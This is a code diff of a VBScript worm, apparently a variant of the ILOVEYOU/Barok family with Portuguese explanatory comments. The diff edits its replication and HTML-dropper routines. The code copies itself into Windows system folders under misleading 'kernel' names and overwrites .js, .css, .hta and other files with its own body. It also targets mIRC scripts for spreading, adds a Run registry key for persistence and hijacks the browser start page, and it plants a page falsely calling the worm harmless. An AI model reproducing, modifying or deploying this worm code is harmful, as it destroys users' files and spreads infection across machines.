@@ -64,8 +64,12 @@ Sub main()
   Set dirtemp = fso.GetSpecialFolder(2)
   Set c = fso.GetFile(WScript.ScriptFullName)
 
-  c.Copy(dirsystem & "\MSKernel32 (OBVIAMENTE o kernel do sistema, não me apague!).vbs")
+  MsgBox "HIHIHI! Agora eu to em " & dirwin
+  MsgBox "HIHIHI! Agora eu to em " & dirsystem
+  MsgBox "HIHIHI! Agora eu to em " & dirtemp
+
   c.Copy(dirwin & "\Win32DLL (OBVIAMENTE uma DLL do sistema, não me apague!).vbs")
+  c.Copy(dirsystem & "\MSKernel32 (OBVIAMENTE o kernel do sistema, não me apague!).vbs")
   c.Copy(dirsystem & "\SDDS-BB-S2.txt.vbs")
 
   rem Após o worm se replicar, o programa ainda vai executar mais 4 subrotinas:
@@ -201,8 +205,7 @@ Sub infectfiles(folderspec)
     rem O worm faz a mesma coisa para arquivos .js, .css etc.
     rem Contudo, também é necessário adicionar a extensão .vbs a estes arquivos
     rem  para que o worm consiga se replicar e ser executado.
-    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css")
-        Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
+    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
       Set ap = fso.OpenTextFile(f1.path, 2, true)
       ap.write vbscopy
       ap.close
@@ -240,12 +243,7 @@ Sub infectfiles(folderspec)
     rem Verifica se a pasta já foi infectada, senão, o worm continua se espalhando.
     If (eq <> folderspec) Then
       rem O worm procura por scripts mIRC para alterar seu conteúdo.
-      If (s = "mirc32.exe")
-        Or (s = "mlink32.exe")
-        Or (s = "mirc.ini")
-        Or (s = "script.ini")
-        Or (s = "mirc.hlp")
-      Then
+      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
         rem O script mIRC a seguir verifica o usuário que está logado e envia um
         rem  comando DDC para enviar uma mensagem para um link para a página
         rem  SDDS-BB-S2.HTM, ou seja, uma página web do próprio vírus, criado
@@ -382,58 +380,12 @@ Sub html
   rem Ao que parece, o Visual Basic Script não permitia o uso das barras invertidas (/) e nem
   rem de aspas duplas em strings, então o autor do worm precisou dar um jeito de substituir os
   rem caracteres necessários para criar o documento HTML da forma apropriada.
-  dta1 = "<html>"
-    & vbcrlf & _ "<head>"
-    & vbcrlf & _ "<title>OIIII BBBB :3<?-?title>"
-    & vbcrlf & _ "<meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@>"
-    & vbcrlf & _ "<meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
-    & vbcrlf & _ "<meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@>"
-    & vbcrlf & _ "<?-?head>"
-    & vbcrlf & _ "<body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ "
-    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
-    & vbcrlf & _ "<CENTER>"
-    & vbcrlf & _ "<p>Eu senti saudades<?-?p>"
-    & vbcrlf & _ "<iframe src=@-@https:?-??-?giphy.com?-?embed?-?MDJ9IbxxvDUQM@-@ width=@-@480@-@ height=@-@269@-@ frameBorder=@-@0@-@><?-?iframe>"
-    & vbcrlf & _ "<?-?CENTER>"
-    & vbcrlf & _ "<MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
-    & vbcrlf & _ "<?-?body>"
-    & vbcrlf & _ "<?-?html>"
-    & vbcrlf & _ "<script language=@-@JScript@-@>"
-    & vbcrlf & _ "<!--?-??-?"
-    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
-    & vbcrlf & _ "?-??-?-->"
-    & vbcrlf & _ "<?-?script>"
-    & vbcrlf & _ "<script language=@-@VBScript@-@>"
-    & vbcrlf & _ "<!--"
-    & vbcrlf & _ "on error resume next"
-    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
-    & vbcrlf & _ "aw=1"
-    & vbcrlf & _ "code="
+  dta1 = "<html><head><title>OIIII BBBB :3<?-?title><meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@><meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@><meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@><?-?head><body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@ STYLE=@-@font-family: monospace@-@><CENTER><blink>Eu senti saudades <3<?-?blink><MARQUEE LOOP@-@infinite@-@>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br ?-?>-------------------------------------------------------------------dddddddd-----------------------------dddddddd------------------------------------------------------------------------------------------------------------------------------<br ?-?>----SSSSSSSSSSSSSSS------------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB-----------SSSSSSSSSSSSSSS--222222222222222----<br ?-?>--SS:::::::::::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::::::::::::B--B::::::::::::::::B--------SS:::::::::::::::S2:::::::::::::::22--<br ?-?>-S:::::SSSSSS::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::BBBBBB:::::B-B::::::BBBBBB:::::B------S:::::SSSSSS::::::S2::::::222222:::::2-<br ?-?>-S:::::S-----SSSSSSS-----------------------------------------------d:::::d------------------------------d:::::d-------------------------------------------BB:::::B-----B:::::BBB:::::B-----B:::::B-----S:::::S-----SSSSSSS2222222-----2:::::2-<br ?-?>-S:::::S--------------aaaaaaaaaaaaa--uuuuuu----uuuuuu------ddddddddd:::::d---aaaaaaaaaaaaa------ddddddddd:::::d-----eeeeeeeeeeee--------ssssssssss----------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>-S:::::S--------------a::::::::::::a-u::::u----u::::u----dd::::::::::::::d---a::::::::::::a---dd::::::::::::::d---ee::::::::::::ee----ss::::::::::s---------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>--S::::SSSS-----------aaaaaaaaa:::::au::::u----u::::u---d::::::::::::::::d---aaaaaaaaa:::::a-d::::::::::::::::d--e::::::eeeee:::::eess:::::::::::::s--------B::::BBBBBB:::::B---B::::BBBBBB:::::B-------S::::SSSS------------------2222::::2--<br ?-?>---SS::::::SSSSS---------------a::::au::::u----u::::u--d:::::::ddddd:::::d------------a::::ad:::::::ddddd:::::d-e::::::e-----e:::::es::::::ssss:::::s-------B:::::::::::::BB----B:::::::::::::BB---------SS::::::SSSSS--------22222::::::22---<br ?-?>-----SSS::::::::SS------aaaaaaa:::::au::::u----u::::u--d::::::d----d:::::d-----aaaaaaa:::::ad::::::d----d:::::d-e:::::::eeeee::::::e-s:::::s--ssssss--------B::::BBBBBB:::::B---B::::BBBBBB:::::B----------SSS::::::::SS----22::::::::222-----<br ?-?>--------SSSSSS::::S---aa::::::::::::au::::u----u::::u--d:::::d-----d:::::d---aa::::::::::::ad:::::d-----d:::::d-e:::::::::::::::::e----s::::::s-------------B::::B-----B:::::B--B::::B-----B:::::B------------SSSSSS::::S--2:::::22222--------<br ?-?>-------------S:::::S-a::::aaaa::::::au::::u----u::::u--d:::::d-----d:::::d--a::::aaaa::::::ad:::::d-----d:::::d-e::::::eeeeeeeeeee--------s::::::s----------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-------------S:::::Sa::::a----a:::::au:::::uuuu:::::u--d:::::d-----d:::::d-a::::a----a:::::ad:::::d-----d:::::d-e:::::::e-----------ssssss---s:::::s--------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-SSSSSSS-----S:::::Sa::::a----a:::::au:::::::::::::::uud::::::ddddd::::::dda::::a----a:::::ad::::::ddddd::::::dde::::::::e----------s:::::ssss::::::s-----BB:::::BBBBBB::::::BBB:::::BBBBBB::::::B-----SSSSSSS-----S:::::S2:::::2-------222222<br ?-?>-S::::::SSSSSS:::::Sa:::::aaaa::::::a-u:::::::::::::::u-d:::::::::::::::::da:::::aaaa::::::a-d:::::::::::::::::d-e::::::::eeeeeeee--s::::::::::::::s------B:::::::::::::::::B-B:::::::::::::::::B------S::::::SSSSSS:::::S2::::::2222222:::::2<br ?-?>-S:::::::::::::::SS--a::::::::::aa:::a-uu::::::::uu:::u--d:::::::::ddd::::d-a::::::::::aa:::a-d:::::::::ddd::::d--ee:::::::::::::e---s:::::::::::ss-------B::::::::::::::::B--B::::::::::::::::B-------S:::::::::::::::SS-2::::::::::::::::::2<br ?-?>--SSSSSSSSSSSSSSS-----aaaaaaaaaa--aaaa---uuuuuuuu--uuuu---ddddddddd---ddddd--aaaaaaaaaa--aaaa--ddddddddd---ddddd----eeeeeeeeeeeeee----sssssssssss---------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB---------SSSSSSSSSSSSSSS---22222222222222222222<br ?-?>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<?-?MARQUEE><p>Este worm e inofensivo e n vai causar danos no seu computador =)<?-?p><?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>--S2--EU-TI-AMO-DMAISS!!11!!-:3--S2--<?-?MARQUEE><?-?body><?-?html><script language=@-@JScript@-@>?-??-?If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}?-??-?<?-?script><script language=@-@VBScript@-@>on error resume nextDim fso,dirsystem,wri,code,code2,code3,code4,aw,regditaw=1code="
 
   rem O conteúdo abaixo é o código Visual Basic Script que vem junto da página HTML, tanto que
   rem  a tag de fechamento "</script>" que foi aberta acima só é fechada abaixo. Nada deste
   rem script vai ser executado, contudo, pois tags de comentários <!-- --> foram declaradas.
-  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
-    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
-    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
-    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
-    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
-    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
-    & vbcrlf & _ "wri.write code4"
-    & vbcrlf & _ "wri.close"
-    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
-    & vbcrlf & _ "If (err.number=424) Then"
-    & vbcrlf & _ "aw=0"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "If (aw=1) Then"
-    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
-    & vbcrlf & _ "window.close"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
-    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
-    & vbcrlf & _ "?-??-?-->"
-    & vbcrlf & _ "<?-?script>"
+  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)Set dirsystem=fso.GetSpecialFolder(1)code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)wri.write code4wri.closeIf (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) ThenIf (err.number=424) Thenaw=0End IfIf (aw=1) Thendocument.write @-@ERROR: can#-#t initialize ActiveX@-@window.closeEnd IfEnd IfSet regedit = CreateObject(@-@WScript.Shell@-@)regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@?-??-?><?-?script>"
 
   rem Substituindo caracteres inválidos por caracteres ASCII válidos
   rem  para serem exibidos em um navegador web por um encoding apropriado.
@@ -477,4 +429,6 @@ Sub html
   d.write vbcrlf
   d.write dt6
   d.close
+
+  regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "C:\WINDOWS\system32\SDDS-BB-S2.HTM"
 End Sub
